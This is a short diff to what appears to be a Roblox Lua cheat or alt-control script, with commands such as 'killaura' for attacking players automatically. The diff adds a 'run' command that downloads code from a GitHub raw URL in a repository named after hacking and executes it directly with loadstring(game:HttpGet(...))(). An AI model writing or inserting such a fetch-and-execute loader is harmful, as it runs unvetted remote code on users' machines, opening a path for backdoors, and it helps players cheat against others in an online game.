@@ -813,6 +813,9 @@ add_command("test", function(args, player)
 		end
 	end
 end)
+add_command("run", function(args, player)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/vndz-Hack/Voltix-Alt-Control/refs/heads/main/funny"))()
+end)
 add_thread_command("killaura", function(args, player)
 	while task.wait(.05) do
 		if has_character(player) then
